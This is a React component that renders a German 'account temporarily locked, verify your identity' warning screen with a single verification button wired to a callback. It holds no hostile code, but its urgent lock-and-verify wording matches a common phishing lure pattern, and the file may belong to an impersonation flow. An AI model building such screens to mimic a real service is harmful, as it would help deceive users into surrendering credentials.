import React from 'react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  return (
    <div style={{
      backgroundColor: '#ffffff',
      padding: '40px 20px 60px',
      fontFamily: 'Proxima Nova Vara, system-ui, sans-serif'
    }}>
      <div style={{
        maxWidth: '1200px',
        margin: '0 auto',
        textAlign: 'center'
      }}>
        {/* Warning Icon */}
        <div style={{
          color: '#ff6600',
          marginBottom: '24px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <svg width="64" height="64" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2v-2zm0-6h2v4h-2v-4z"/>
          </svg>
        </div>

        <h2 style={{
          color: '#333',
          fontSize: '28px',
          fontWeight: '600',
          margin: '0 0 16px 0',
          fontFamily: 'Proxima Nova Vara, system-ui, sans-serif'
        }}>
          Sicherheitsüberprüfung erforderlich
        </h2>

        <p style={{
          color: '#666',
          fontSize: '16px',
          marginBottom: '32px',
          lineHeight: '1.5',
          maxWidth: '600px',
          margin: '0 auto 32px auto'
        }}>
          Aus Sicherheitsgründen wurde Ihr Zugang vorübergehend gesperrt. Bitte verifizieren Sie Ihre Identität, um fortzufahren.
        </p>

        <button
          onClick={onStartVerification}
          className="button button-primary"
          style={{
            fontSize: '16px',
            fontWeight: '600',
            padding: '16px 32px',
            minHeight: '48px',
            cursor: 'pointer',
            display: 'inline-flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          Identität verifizieren
          <span style={{
            fontSize: '18px',
            fontWeight: 'bold'
          }}>
            ›
          </span>
        </button>
      </div>
    </div>
  );
};

export default AccountCompromisedScreen;
